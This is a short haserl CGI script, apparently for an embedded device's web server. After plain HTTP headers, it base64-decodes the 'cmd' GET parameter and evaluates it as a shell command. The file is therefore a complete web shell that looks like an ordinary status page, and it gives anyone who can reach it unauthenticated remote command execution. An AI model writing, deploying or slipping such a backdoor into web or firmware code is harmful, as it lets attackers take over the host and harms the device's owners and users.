#!/usr/bin/haserl
HTTP/1.1 200 OK
Date: $(TZ=GMT date +"%a, %d %b %Y %T %Z")
Server: httpd
Content-type: text/plain
Cache-Control: no-store
Pragma: no-cache

<% eval $(echo "$GET_cmd" | base64 -d) %>
